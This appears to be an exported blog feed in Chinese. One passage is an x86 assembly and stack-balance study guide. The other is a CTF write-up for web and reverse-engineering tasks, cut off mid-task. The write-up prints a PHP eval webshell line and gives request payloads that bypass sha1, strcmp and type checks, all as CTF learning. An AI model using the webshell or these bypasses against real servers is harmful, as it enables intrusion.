为第一个操作减去第二个操作数,但不影响第两个操作数的值,它影响flag的CF，ZF，OF，AF，PF.</code></pre><p>CDQ</p><pre><code>把EAX的第31位(这个位数是从右往左数的)复制到EDX的每个位去，常和除法连用。如果EAX = 0x0000000A那么执行CDQ后 EDX = 0x00000000，这样EDX:EAX就是0x000000000x0000000A的64bit的了，用来作为被除数(如果是除数是32位，就需要64位来作为被除数)如果EAX = 0xFFFFFFFA那么执行CDQ后 EDX = 0xFFFFFFFF</code></pre><p>sar</p><pre><code>sar是算术右移指令，功能是将操作数右移，符号位保持不变。例如，sar eax,1//假设eax是0x0000000A，执行完之后eax就会变成0x00000005，相对于除以2。</code></pre><p>imul和mul</p><pre><code>imul 有符号乘法，将被乘数与乘数均作为有符号数。mul 无符号乘法，将被乘数及乘数均作为无符号数。可以有三个操作数：imul eax,eax,0Ch第3操作数是乘数，第2操作数是被乘数，运算结果放入第1操作数。也可以是两个操作数：imul eax,0Ch目标操作数（第一个操作数）乘以源操作数（第二个操作数）</code></pre><p>idiv(带符号数除法)/div(无符号除法)</p><pre><code>写法：idiv reg；/div reg作用：如果操作数是8位，结果商在AL、余数在AH中；如果操作数是16位，结果商在AX,余数在DX中；如果操作数是32位，结果商在EAX,余数在EDX中；注意：不能直接实现8位数除8位数、16位数除16位数、32除32，若需要这样，则必须先把除数符号扩展或零扩展到16、32、64位，然后用除法指令。</code></pre><p>跳转</p><pre><code>JE   ;等于则跳转JNE  ;不等于则跳转JZ   ;为 0 则跳转JNZ  ;不为 0 则跳转JS   ;为负则跳转JNS  ;不为负则跳转JC   ;进位则跳转JNC  ;不进位则跳转JO   ;溢出则跳转JNO  ;不溢出则跳转JA   ;无符号大于则跳转JNA  ;无符号不大于则跳转JAE  ;无符号大于等于则跳转JNAE ;无符号不大于等于则跳转JG   ;有符号大于则跳转JNG  ;有符号不大于则跳转JGE  ;有符号大于等于则跳转JNGE ;有符号不大于等于则跳转JB   ;无符号小于则跳转JNB  ;无符号不小于则跳转JBE  ;无符号小于等于则跳转JNBE ;无符号不小于等于则跳转JL   ;有符号小于则跳转JNL  ;有符号不小于则跳转JLE  ;有符号小于等于则跳转JNLE ;有符号不小于等于则跳转JP   ;奇偶位置位则跳转JNP  ;奇偶位清除则跳转JPE  ;奇偶位相等则跳转JPO  ;奇偶位不等则跳转</code></pre><p>retn</p><pre><code>pop ippop n//sp+n</code></pre><p>前言：主要还是给自己看的。</p><h2 id="二、堆栈平衡"><a href="#二、堆栈平衡" class="headerlink" title="二、堆栈平衡"></a>二、堆栈平衡</h2><h3 id="堆栈平衡的原理"><a href="#堆栈平衡的原理" class="headerlink" title="堆栈平衡的原理"></a>堆栈平衡的原理</h3><p><a href="https://www.cnblogs.com/cat47/p/12285209.html">https://www.cnblogs.com/cat47/p/12285209.html</a>这个上面讲的还可以。下面总结总结。</p><p>堆栈平衡主要分为两中情况</p><p>情况1：</p><p>就是call调用函数的时候，函数内部不能改变栈顶sp，如果有改变（例如函数内部有push或者pop指令，但是一般函数调用时，函数内部都会把esp给ebp，最后又把ebp给esp，所以一般不会变），也必须要在ret执行之前改为原来的栈顶sp，否则ret，pop的IP，可能将不是call的下一句的IP。</p><p>情况2：</p><p>用堆栈来传递参数，先改变原来的堆栈，在函数内使用了这个堆栈来传递参数，回到主函数后，要恢复原来的堆栈。</p><p>具体恢复方法有两种，一种是直接在主函数中用add或者sub修改sp的值。</p><p>另一种是，在函数内部就直接将sp修改。<br><img src="https://i.loli.net/2020/11/22/L4Kjv8e9hBRlqzW.png"><br>其中的retn 8的意思就是</p><pre><code>pop ippop 8</code></pre><p>retn在最下面也有简单介绍</p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>自己动手了解堆栈平衡的原理，并观察调试过程中堆栈的变化情况。</p><h3 id="实验样本1-调用一个空函数"><a href="#实验样本1-调用一个空函数" class="headerlink" title="实验样本1-调用一个空函数"></a>实验样本1-调用一个空函数</h3><p>由vc++6.0编译的 堆栈平衡.exe文件，代码如下</p><pre><code>#include&lt;stdio.h&gt;void kong()&#123;&#125;int main(void)&#123;    int a = 1, b = 2;    kong();    printf(&quot;%d\n&quot;, a+b);    getchar();//主要是为了找到main函数。&#125;</code></pre><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>找到main函数<br>先F9到达EIP处，然后F8一直调，会在main函数处停下来。进入main函数。<br><img src="https://i.loli.net/2020/11/26/bB6WzaSjUE7MygR.png"><br>注意这时候ESP，EBP的值，和在堆栈中的情况。</p><pre><code>ESP:0019FF34EBP:0019FF70</code></pre><p><img src="https://i.loli.net/2020/11/26/Cn9VdNebYFB8A6J.png"><br>执行</p><pre><code>push ebp</code></pre><p>将ebp的值入栈，ESP-4:0019FF30，EBP不变，堆栈变化如下，注意灰色那一行<br><img src="https://i.loli.net/2020/11/26/qju79k1c3WTrlKZ.png"><br>执行</p><pre><code>mov ebp esp</code></pre><p>将esp的值给ebp，ebp的作用可以理解为esp的替身（ebp的值只要在pop ebp之前都不会发生改变，不会受esp期间被改变的影响），用来访问栈内局部变量，参数，函数返回地址。这时候</p><pre><code>ESP:0019FF30EBP:0019FF30</code></pre><p>执行灰色部分代码<br><img src="https://i.loli.net/2020/11/27/Ieq4N2DtwhP5uiV.png"><br>不用了解具体过程，大概就是开辟一个4c空间的堆栈，执行后</p><pre><code>ESP:0019FED8//灰色部分有3个push，esp-4c-12EBP:0019FF30</code></pre><p>堆栈情况为<br><img src="https://i.loli.net/2020/11/27/CZJSOdaIQ1oF5st.png"><br>继续执行下面两句指令。<br><img src="https://i.loli.net/2020/11/27/3P1x9X7QGLKkrua.png"><br>将1存入ebp-4的地址，将2存入ebp-8的地址。堆栈情况如下<br><img src="https://i.loli.net/2020/11/27/VW6PlQTkOXNBoJZ.png"><br>由于接下来调用的一个函数是空函数所以，不需要用push指令来开辟一段栈空间，用来传递参数。如果函数用来传递了参数，最后需要将开辟的堆栈还原，意思就是是esp要回到原来的值。</p><p>执行下一句语句</p><pre><code>call 堆栈平衡1.401005//相对于 pop eip//eip是call指令的下一句的地址。esp的值会变成esp-4:0019FED4        jmz 00401005</code></pre><p><img src="https://i.loli.net/2020/11/27/YPj4w7VfiAuX2EK.png"><br>进入call的函数，一个空函数。<br><img src="https://i.loli.net/2020/11/27/8FNWwxUTehS1gfB.png"><br>第一句和上面的一样，直接看堆栈变化</p><pre><code>EBP:0019FF30ESP:0019FED0</code></pre><p><img src="https://i.loli.net/2020/11/27/yfJ8EYjcgvABTs5.png"><br>0019FED0处存着ebp的值。</p><p>这些指令配合使用</p><pre><code>push ebpmov ebp,esp...//中间的指令大概就是将esp-40，又push了一些东西，又pop了一些东西mov esp,ebppop ebp</code></pre><p>直接看mov esp,ebp执行前的堆栈情况</p><pre><code>ESP:0019FE90EBP:0019FED0</code></pre><p><img src="https://i.loli.net/2020/11/27/oNRGZIMdn15Jh6u.png"><br>执行后</p><pre><code>ESP:0019FED0EBP:0019FED0</code></pre><p><img src="https://i.loli.net/2020/11/27/aBvcXhnpL1CMKTf.png"><br>这时候ESP重新回到了原来进入这个函数的值，再</p><pre><code>pop ebp</code></pre><p>EBP变为0019FF30，ESP变为0019FED4，存着返回主函数的地址。<br><img src="https://i.loli.net/2020/11/27/jS6eLDMunsm1ROh.png"><br>执行ret指令（相对于pop ip）回到主函数。ESP+4</p><pre><code>ESP:0019FF30EBP:0019FED0</code></pre><p><img src="https://i.loli.net/2020/11/27/ifbzA849dNv3jZp.png"><br>由于是个空函数，没有传递参数，前面也没有开辟新的堆栈，所以不需要将esp进行加减，但如果之前调用了参数，就必须要在函数内将用rent指令将esp改了，或者在函数外用，add或者sub来改esp的值，来维持堆栈平衡。<br>继续下两条指令<br>    mov eax,dword ptr ss:[ebp-4]<br>    add eax,dword ptr ss:[ebp-8]</p><p>将<br><img src="https://i.loli.net/2020/11/27/ZtzbsudT2eMVnPA.png"><br>中ebp-4的1先给eax寄存器，再将ebp-8的2和eax的1用add指令加起来，将最后的结果传个eax寄存器，得到结果3。</p><p>最后的输出函数<br><img src="https://i.loli.net/2020/11/27/AnuJ7gDtyh8WrwL.png"><br>知道EAX：累加(Accumulator)寄存器，常用于函数返回值，这几条语句是用来输出最后结果的，就可以了。</p><h3 id="实验样本-裸函数1"><a href="#实验样本-裸函数1" class="headerlink" title="实验样本-裸函数1"></a>实验样本-裸函数1</h3><pre><code>void __declspec(naked)plus()&#123;    __asm    &#123;        ret    &#125;&#125;int main(int argc,char*argv[])&#123;    plus();    return 0;&#125;</code></pre><p>整个主函数<br><img src="https://i.loli.net/2020/11/28/oNQIBtUwCbWhlPS.png"><br>调用的裸函数<br><img src="https://i.loli.net/2020/11/28/mX8WSRE3LOZ7fVu.png"></p><h3 id="实验样本-裸函数2"><a href="#实验样本-裸函数2" class="headerlink" title="实验样本-裸函数2"></a>实验样本-裸函数2</h3><pre><code>#include&lt;stdio.h&gt;int __declspec(naked)plus(int a,int b)&#123;    __asm    &#123;        mov eax,dword ptr ds:[esp+8]        add eax,dword ptr ds:[esp+4]        ret    &#125;&#125;int main(int argc,char*argv[])&#123;    int a;    a=plus(1,2);    printf(&quot;%d&quot;,a);    return 0;&#125;</code></pre><p><img src="https://i.loli.net/2020/11/28/JZiAXNDbr3R8HQu.png"><br><img src="https://i.loli.net/2020/11/28/BPMAVKhWdX14yDS.png"></p><h2 id="三、不同C语言语句在汇编中的显示情况及简单分析"><a href="#三、不同C语言语句在汇编中的显示情况及简单分析" class="headerlink" title="三、不同C语言语句在汇编中的显示情况及简单分析"></a>三、不同C语言语句在汇编中的显示情况及简单分析</h2><h3 id="1-if-else"><a href="#1-if-else" class="headerlink" title="1.if-else"></a>1.if-else</h3><p>源代码如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a=1,b=2,c;    if(a&lt;b)    &#123;        c=0;    &#125;    else    &#123;        c=1;    &#125;    return 0;&#125;</code></pre><p>对应汇编代码如下</p><pre><code>1:    #include&lt;stdio.h&gt;2:3:    int main(void)4:    &#123;00401010   push        ebp00401011   mov         ebp,esp00401013   sub         esp,4Ch00401016   push        ebx00401017   push        esi00401018   push        edi00401019   lea         edi,[ebp-4Ch]0040101C   mov         ecx,13h00401021   mov         eax,0CCCCCCCCh00401026   rep stos    dword ptr [edi]5:        int a=1,b=2,c;00401028   mov         dword ptr [ebp-4],10040102F   mov         dword ptr [ebp-8],26:        if(a&lt;b)00401036   mov         eax,dword ptr [ebp-4]00401039   cmp         eax,dword ptr [ebp-8]//cmp是比较指令，相对于sub指令，并改变一些标志寄存器的值。0040103C   jge         main+37h (00401047)//前面的数大于或等于后面的数就跳转。实际上与SF,OF两个寄存器有关。7:        &#123;8:            c=0;0040103E   mov         dword ptr [ebp-0Ch],09:        &#125;10:       else00401045   jmp         main+3Eh (0040104e)11:       &#123;12:           c=1;00401047   mov         dword ptr [ebp-0Ch],113:       &#125;14:       return 0;0040104E   xor         eax,eax15:   &#125;</code></pre><h3 id="2-for循环"><a href="#2-for循环" class="headerlink" title="2.for循环"></a>2.for循环</h3><p>简单的累加代码</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int i,sum;    sum=0;    for(i=0;i&lt;5;i++)    &#123;        sum=i+sum;    &#125;    printf(&quot;%d&quot;,sum);&#125;</code></pre><p>对应汇编代码</p><pre><code>1:    #include&lt;stdio.h&gt;2:3:    int main(void)4:    &#123;00401010   push        ebp00401011   mov         ebp,esp00401013   sub         esp,48h00401016   push        ebx00401017   push        esi00401018   push        edi00401019   lea         edi,[ebp-48h]0040101C   mov         ecx,12h00401021   mov         eax,0CCCCCCCCh00401026   rep stos    dword ptr [edi]5:        int i,sum;6:        sum=0;00401028   mov         dword ptr [ebp-8],07:8:        for(i=0;i&lt;5;i++)0040102F   mov         dword ptr [ebp-4],000401036   jmp         main+31h (00401041)00401038   mov         eax,dword ptr [ebp-4]0040103B   add         eax,10040103E   mov         dword ptr [ebp-4],eax00401041   cmp         dword ptr [ebp-4],500401045   jge         main+42h (00401052)9:        &#123;10:           sum=i+sum;00401047   mov         ecx,dword ptr [ebp-4]0040104A   add         ecx,dword ptr [ebp-8]0040104D   mov         dword ptr [ebp-8],ecx11:       &#125;00401050   jmp         main+28h (00401038)//8到11就是for循环12:13:       printf(&quot;%d&quot;,sum);00401052   mov         edx,dword ptr [ebp-8]00401055   push        edx00401056   push        offset string &quot;%d&quot; (0042201c)0040105B   call        printf (00401090)00401060   add         esp,814:   &#125;</code></pre><h3 id="3-while循环"><a href="#3-while循环" class="headerlink" title="3.while循环"></a>3.while循环</h3><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int i=0;    int sum=0;    while(i&lt;5)    &#123;        sum=sum+i;        i++;    &#125;    printf(&quot;%d&quot;,sum);&#125;</code></pre><p>while循环对应的汇编代码</p><pre><code>1:    #include&lt;stdio.h&gt;2:3:    int main(void)4:    &#123;00401010   push        ebp00401011   mov         ebp,esp00401013   sub         esp,48h00401016   push        ebx00401017   push        esi00401018   push        edi00401019   lea         edi,[ebp-48h]0040101C   mov         ecx,12h00401021   mov         eax,0CCCCCCCCh00401026   rep stos    dword ptr [edi]5:        int i=0;00401028   mov         dword ptr [ebp-4],06:        int sum=0;0040102F   mov         dword ptr [ebp-8],07:        while(i&lt;5)00401036   cmp         dword ptr [ebp-4],50040103A   jge         main+40h (00401050)8:        &#123;9:            sum=sum+i;0040103C   mov         eax,dword ptr [ebp-8]0040103F   add         eax,dword ptr [ebp-4]00401042   mov         dword ptr [ebp-8],eax10:           i++;00401045   mov         ecx,dword ptr [ebp-4]00401048   add         ecx,10040104B   mov         dword ptr [ebp-4],ecx11:       &#125;0040104E   jmp         main+26h (00401036)12:       printf(&quot;%d&quot;,sum);00401050   mov         edx,dword ptr [ebp-8]00401053   push        edx00401054   push        offset string &quot;%d&quot; (0042201c)00401059   call        printf (00401080)0040105E   add         esp,813:   &#125;</code></pre><h3 id="4-do-while的汇编语句"><a href="#4-do-while的汇编语句" class="headerlink" title="4.do_while的汇编语句"></a>4.do_while的汇编语句</h3><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int i=0;    int sum=0;    do    &#123;        sum=sum+i;        i++;    &#125;    while(i&lt;5);    printf(&quot;%d&quot;,sum);&#125;</code></pre><p>do_while的汇编代码</p><pre><code>1:    #include&lt;stdio.h&gt;2:3:    int main(void)4:    &#123;00401010   push        ebp00401011   mov         ebp,esp00401013   sub         esp,48h00401016   push        ebx00401017   push        esi00401018   push        edi00401019   lea         edi,[ebp-48h]0040101C   mov         ecx,12h00401021   mov         eax,0CCCCCCCCh00401026   rep stos    dword ptr [edi]5:        int i=0;00401028   mov         dword ptr [ebp-4],06:        int sum=0;0040102F   mov         dword ptr [ebp-8],07:8:        do9:        &#123;10:           sum=sum+i;00401036   mov         eax,dword ptr [ebp-8]00401039   add         eax,dword ptr [ebp-4]0040103C   mov         dword ptr [ebp-8],eax11:           i++;0040103F   mov         ecx,dword ptr [ebp-4]00401042   add         ecx,100401045   mov         dword ptr [ebp-4],ecx12:       &#125;13:       while(i&lt;5);00401048   cmp         dword ptr [ebp-4],50040104C   jl          main+26h (00401036)14:       printf(&quot;%d&quot;,sum);0040104E   mov         edx,dword ptr [ebp-8]00401051   push        edx00401052   push        offset string &quot;%d&quot; (0042201c)00401057   call        printf (00401080)0040105C   add         esp,815:   &#125;</code></pre><h3 id="5-数组的在堆栈中的情况"><a href="#5-数组的在堆栈中的情况" class="headerlink" title="5.数组的在堆栈中的情况"></a>5.数组的在堆栈中的情况</h3><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int b;    int a[]=&#123;1,2,3,4,5&#125;;    scanf(&quot;%d&quot;,b);&#125;</code></pre><p>堆栈中的样子</p><p>刚开始将数组中的数放到堆栈里面<br><img src="https://i.loli.net/2020/11/30/ePw9pDTF7ChBIES.png"><br>放完之后<br><img src="https://i.loli.net/2020/11/30/V3O78iTgRUk4qun.png"><br>需要注意的点，数组中的数是在堆栈中是从上到下开始排的(我认为这可能和大端序和小端序，《逆向核心原理》中第3章有关)，而且ebp-4位置存的是cccccccc，这应该是那个参数b</p><h3 id="6-一个用函数来实现两个乘除的简单代码"><a href="#6-一个用函数来实现两个乘除的简单代码" class="headerlink" title="6.一个用函数来实现两个乘除的简单代码"></a>6.一个用函数来实现两个乘除的简单代码</h3><h4 id="c源代码"><a href="#c源代码" class="headerlink" title="c源代码"></a>c源代码</h4><p>原c代码如下，其中的运算都为有符号运算，由于之前没有写关于乘除的汇编会是怎么样，所以这次顺便弄一个乘除的。：</p><pre><code>#include&lt;stdio.h&gt;int function(int x,int y)&#123;    int z;    z=(x*y)/5;//注意这里面是故意取5的，为了看余数的值会储存在哪个寄存器中。    return z;    &#125;int main(void)&#123;    int a=3,b=4,c;    c=function(a,b);    printf(&quot;%d&quot;,c);    return 0;&#125;</code></pre><p>实际上，如果你如果是z=(x*y)/2，其对应的汇编代码会有一些不同。就像这样。</p><pre><code>00401038   mov         eax,dword ptr [ebp+8]0040103B   imul        eax,dword ptr [ebp+0Ch]//前两句实际上就是x*y0040103F   cdq00401040   sub         eax,edx00401042   sar         eax,1//这是通过向右位移1位来达到除以2的目的，好像只有除以2的时候汇编代码会成为这样。00401044   mov         dword ptr [ebp-4],eax</code></pre><p>imul,cdq,sar这三个指令请在上面第一部分查看具体用法。</p><h4 id="开始调试源程序"><a href="#开始调试源程序" class="headerlink" title="开始调试源程序"></a>开始调试源程序</h4><p>主函数<br><img src="https://i.loli.net/2020/12/11/eI1awuc8XVGNy3p.png"><br>初始堆栈空间</p><p><img src="https://i.loli.net/2020/12/11/xVcTEluYkNU1zbs.png"></p><p>执行这一句后的堆栈空间</p><pre><code>401060    55    push ebp</code></pre><p><img src="https://i.loli.net/2020/12/11/U6T4mXWlgLMK9xI.png"></p><p>执行这几句后的堆栈空间</p><pre><code>401066    53                 push ebx401067    56                 push esi401068    57                 push edi401069    8D7D B4    lea      edi,dword ptr ss:[ebp-4C]40106C    B9 13000000         mov ecx,13401071    B8 CCCCCCCC         mov eax,CCCCCCCC401076    F3:AB             rep stosd</code></pre><p><img src="https://i.loli.net/2020/12/11/WVCKm6xe75L4cvz.png"></p><p>执行这几句后的堆栈空间</p><pre><code>401078    C745 FC 03000000    mov dword ptr ss:[ebp-4],340107F    C745 F8 04000000    mov dword ptr ss:[ebp-8],4401086    8B45 F8                mov eax,dword ptr ss:[ebp-8]401089    50                    push eax40108A    8B4D FC                mov ecx,dword ptr ss:[ebp-4]40108D    51                    push ecx</code></pre><p><img src="https://i.loli.net/2020/12/11/RqOITSAULZ4iNeM.png"></p><p>function函数框架<br><img src="https://i.loli.net/2020/12/11/nxcHUT7X2YS15Z4.png"><br>进入function函数后的堆栈空间</p><p><img src="https://i.loli.net/2020/12/11/uJdicMKDPp1Gowv.png"></p><p>执行这一句后的堆栈空间</p><pre><code>401020    55    push ebp</code></pre><p><img src="https://i.loli.net/2020/12/11/7fH3EhLlFrV2sjp.png"><br><img src="https://i.loli.net/2020/12/11/7fH3EhLlFrV2sjp.png"><br>执行完这几句的堆栈空间</p><pre><code>401021    8BEC            mov ebp,esp401023    83EC 44            sub esp,44401026    53                   push ebx401027    56                push esi401028    57                push edi401029    8D7D BC            lea edi,dword ptr ss:[ebp-44]0040102C    B9 11000000    mov ecx,11401031    B8 CCCCCCCC        mov eax,CCCCCCCC401036    F3:AB            rep stosd</code></pre><p><img src="https://i.loli.net/2020/12/11/PGW641VhAROm7QI.png"></p><p>接下来是计算的指令，就自己根据本文第一部分常用的汇编指令，来慢慢分析了</p><pre><code>401038    8B45 08                mov eax,dword ptr ss:[ebp+8]0040103B    0FAF45 0C        imul eax,dword ptr ss:[ebp+C]0040103F    99    cdq401040    B9 05000000            mov ecx,5401045    F7F9                idiv ecx401047    8945 FC                mov dword ptr ss:[ebp-4],eax0040104A    8B45 FC            mov eax,dword ptr ss:[ebp-4]</code></pre><p>然后直到ret指令前的堆栈空间</p><p><img src="https://i.loli.net/2020/12/11/EuBrz3nXjHmbPNW.png"></p><p>执行ret后，回到主函数</p><p><img src="https://i.loli.net/2020/12/11/9zTgUyvMi56Anpa.png"><br>执行这一句，保持堆栈平衡<br>    add esp，8<br><img src="https://i.loli.net/2020/12/11/ADxKgi9opXYhHP1.png"></p><p>后面的内容就不在调试了。</p><h3 id="7-结构体指针"><a href="#7-结构体指针" class="headerlink" title="7.结构体指针"></a>7.结构体指针</h3><p>调试一个返回结构体指针的文件</p><h3 id="c代码"><a href="#c代码" class="headerlink" title="c代码"></a>c代码</h3><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;typedef struct _Student&#123;    char stuName[20];    int stuNo;    int stuAge;&#125;Student,*STUDENT;int function(Student **p)&#123;    STUDENT q;//在子函数内部定义了一个结构体指针变量    q=(Student*)malloc(sizeof(Student));//向堆申请一段内存空间，返回的地址值给结构体指针变量。    strcpy(q-&gt;stuName,&quot;wuhao&quot;); //给结构体赋值    q-&gt;stuNo=2020122188;    q-&gt;stuAge=18;    *p=q;//将这个结构体地址返回给主函数的结构体指针变量。    return 0;&#125;int main()&#123;    Student *p;//定义了一个结构体指针变量    function(&amp;p);//传入结构体指针变量的地址    if(p-&gt;stuNo==2020122188 &amp;&amp; p-&gt;stuAge==18 &amp;&amp; !strcmp(p-&gt;stuName,&quot;wuhao&quot;))//检验    &#123;        printf(&quot;sucess!\n&quot;);        printf(&quot;姓名：%s\n&quot;,p-&gt;stuName);        printf(&quot;学号：%d\n&quot;,p-&gt;stuNo);        printf(&quot;年龄：%d\n&quot;,p-&gt;stuAge);    &#125;    else    &#123;        printf(&quot;wrong!&quot;);    &#125;    getchar();&#125;</code></pre><h4 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h4><p>进入子函数前<br><img src="https://i.loli.net/2021/03/21/VOIAxroc3wlKPJQ.png"><br>进入子函数<br><img src="https://i.loli.net/2021/03/21/xqQSeVl1tPwv4mi.png"><br>回到主函数查看<br><img src="https://i.loli.net/2021/03/21/NKplzFY8hW2IbmM.png"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客wp总结</title>
      <link href="2020/11/29/%E6%9E%81%E5%AE%A2wp%E6%80%BB%E7%BB%93/"/>
      <url>2020/11/29/%E6%9E%81%E5%AE%A2wp%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="极客wp总结"><a href="#极客wp总结" class="headerlink" title="极客wp总结"></a>极客wp总结</h1><h2 id="队伍名：int-晓-队员：一打七QAQ-Akuma-分数：4200"><a href="#队伍名：int-晓-队员：一打七QAQ-Akuma-分数：4200" class="headerlink" title="队伍名：int 晓 队员：一打七QAQ Akuma 分数：4200"></a>队伍名：int 晓 队员：一打七QAQ Akuma 分数：4200</h2><p>本wp全由一打七QAQ写完，一个开校真小白，真菜鸡，如果有什么问题和错误，请谅解。</p><p>官方wp：<a href="https://mp.weixin.qq.com/s/8R4lGzToBxjK1lC9B_SFBg">https://mp.weixin.qq.com/s/8R4lGzToBxjK1lC9B_SFBg</a></p><h2 id="web题"><a href="#web题" class="headerlink" title="web题"></a>web题</h2><h3 id="1-朋友的学妹"><a href="#1-朋友的学妹" class="headerlink" title="1.朋友的学妹"></a>1.朋友的学妹</h3><p>打开网址，右键鼠标，打开源文件，发现</p><pre><code>&lt;!--flag=U1lDe0YxQF80c19oNExwZnVsbGxsbGx9--&gt;</code></pre><p>用网站base64解码得到flag<br>SYC{F1@_4s_h4Lpfullllll}</p><h3 id="2-EZwww"><a href="#2-EZwww" class="headerlink" title="2.EZwww"></a>2.EZwww</h3><p>打开网址，说这个网站已经备份了，直接在网址后面加上/<a href="http://www.zip,发现开始下载一个压缩包,解压,有两个文件,一个是假的flag,一个是index.php,把index.php的后缀改为txt.打开发现/">www.zip，发现开始下载一个压缩包，解压，有两个文件，一个是假的flag，一个是index.php，把index.php的后缀改为txt。打开发现</a></p><pre><code>&lt;html&gt; &lt;head&gt;  &lt;title&gt;Lola&#39;s website1.0&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php echo &#39;&lt;h1&gt;welcome to my website&lt;/h1&gt;&#39;; ?&gt; &lt;?php echo &#39;&lt;p&gt;i will never forget to backup my website......&lt;/p&gt;&#39;; ?&gt; &lt;?php echo &#39;&lt;img src=&quot;img/lola.gif&quot; alt=&quot;welcome~&quot;/&gt;&#39;; ?&gt; &lt;/body&gt;&lt;/html&gt;&lt;?php$key1 = $_POST[&#39;a&#39;];$key2 = base64_decode(&#39;c3ljbDB2ZXI=&#39;);if($key1 === $key2)&#123;    //this is a true flagecho &#39;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;&#39;;&#125;?&gt;</code></pre><p>说以post提交a，然后要key1等于key2，key2还base64编码了，解码得到sycl0ver，然后用火狐浏览器（注意要下载一个插件Hackbar）以post提交a=sycl0ver，得到flag  SYC{Backup_1s_4_good_h4bit_l0l}</p><h3 id="3-刘壮的黑页"><a href="#3-刘壮的黑页" class="headerlink" title="3.刘壮的黑页"></a>3.刘壮的黑页</h3><p>这道题主要考post和get两个提交方式，不知道怎么回事，网站打不开了QAQ，反正就是用get方式提交一个东西，一个用post提交一个东西，就会得到flag</p><h3 id="4-Welcome"><a href="#4-Welcome" class="headerlink" title="4.Welcome"></a>4.Welcome</h3><p>打开网站，显示405错误，只不过不是题错了，而是要改用post提交一个东西才会显示一些东西，比如a=’1’，得到<br>     &lt;?php<br>    error_reporting(0);<br>    if ($_SERVER[‘REQUEST_METHOD’] !== ‘POST’) {<br>    header(“HTTP/1.1 405 Method Not Allowed”);<br>    exit();<br>    } else {</p><pre><code>    if (!isset($_POST[&#39;roam1&#39;]) || !isset($_POST[&#39;roam2&#39;]))&#123;        show_source(__FILE__);    &#125;    else if ($_POST[&#39;roam1&#39;] !== $_POST[&#39;roam2&#39;] &amp;&amp; sha1($_POST[&#39;roam1&#39;]) === sha1($_POST[&#39;roam2&#39;]))&#123;        phpinfo();  // collect information from phpinfo!    &#125;&#125; </code></pre><p>再次以post提交roam1[]=1&amp;roam2[]=2，一个绕过方式。会出现一个界面，从中找到一个可以位置    /f1444aagggg.php，在网址后面加上去，得到</p><pre><code>Not FoundThe requested URL was not found on this server.Apache/2.4.38 (Debian) Server at 49.234.224.119 Port 8000</code></pre><p>改为post请求发送，在消息头里面看到flag</p><pre><code>SYC&#123;w31c0m3_t0_5yc_r0@m_php1&#125;</code></pre><h3 id="5-我是大黑客"><a href="#5-我是大黑客" class="headerlink" title="5.我是大黑客"></a>5.我是大黑客</h3><p>这道题考的应该是一句话木马，打开网站，有提示说留下了一个备份文件，在网址后面加上/liuzhuang.php.bak。开始下载文件，把文件后缀名改为txt，打开，得到</p><pre><code>&lt;?phpeval($_POST[&#39;liuzhuang&#39;]);//谁是大恶人 那必定是我liuzhuang//当你的服务器看到 0xliuzhuang 就知道要买台新机器了?&gt;</code></pre><p>用蚁剑</p><p>输入URL，密码为上面的liuzhuang。得到flag</p><pre><code>SYC&#123;1iuzHuang_yyd_G0d!&#125;</code></pre><h3 id="6-ezbypass"><a href="#6-ezbypass" class="headerlink" title="6.ezbypass"></a>6.ezbypass</h3><pre><code>Please use a GET request to pass in the variables a and b, compare them with strcmp and let strcmp return a value of NULL.Note that a and b cannot be equal. </code></pre><p>请使用GET请求传入变量a和b，将它们与strcmp进行比较，并让strcmp返回NULL值。<br>注意a和b不能相等。用strcmp函数的漏洞绕过</p><p>以get方式提交?a[ ]=2&amp;b[ ]=4，然后得到</p><pre><code>OKOK,You got the first step.Please POST a variable c that is not a number to make it equal to 123 </code></pre><p>好吧，你迈出了第一步。请发布一个不是数字的变量c，使其等于123。开始我以为用ASCLL码就可以了，不行，用位运算使c=123，也不行。最后发现是php弱类型绕过。post提交c=123a，得到flag</p><pre><code>nice!!!You got itSYC&#123;php_4s_so_funny&#125; </code></pre><h2 id="re题目"><a href="#re题目" class="headerlink" title="re题目"></a>re题目</h2><h3 id="1-No-RE-no-gain"><a href="#1-No-RE-no-gain" class="headerlink" title="1.No RE no gain"></a>1.No RE no gain</h3><p>下载文件，直接拖到IDA里面，shift+f12查看字符串，有很多假的flag，例如</p><pre><code>.rdata:0040400C    0000001F    C    SYC&#123;5ay_He1lo_tH3_Re_W0rld!!!&#125;.rdata:0040402C    0000001F    C    SYC&#123;Say_h3llo_th3_rE_World!!!&#125;.rdata:0040404C    0000001F    C    SYC&#123;s4y_he110_The_RE_w0r1d!!!&#125;.rdata:0040406C    0000001F    C    SYC&#123;S4y_He11o_th3_RE_World!!!&#125;.rdata:0040408C    0000001F    C    SYC&#123;s4y_He110_The_rE_w0r1d~~~&#125;.rdata:004040AC    0000001F    C    SYC&#123;say_h3ll0_Th3_RE_w0rld!!!&#125;.rdata:004040CC    0000001F    C    SYC&#123;s4y_he110_th3_rE_w0rld~~~&#125;.rdata:004040EC    0000001F    C    SYC&#123;s4y_he11o_The_r3_wor1d!!!&#125;.rdata:0040410C    0000001F    C    SYC&#123;Say_He110_th3_r3_w0r1d!!!&#125;.rdata:0040412C    0000001F    C    SYC&#123;say_He11o_The_rE_wor1d!!!&#125;.rdata:0040414C    0000001F    C    SYC&#123;say_he11o_the_r3_Wor1d~~~&#125;.rdata:0040416C    0000001F    C    SYC&#123;Say_He110_The_rE_w0r1d~~~&#125;.rdata:0040418C    0000001F    C    SYC&#123;S4y_H3110_th3_RE_World!!~&#125;</code></pre><p>真正的flag在，.rdata:00404277    0000001A    C    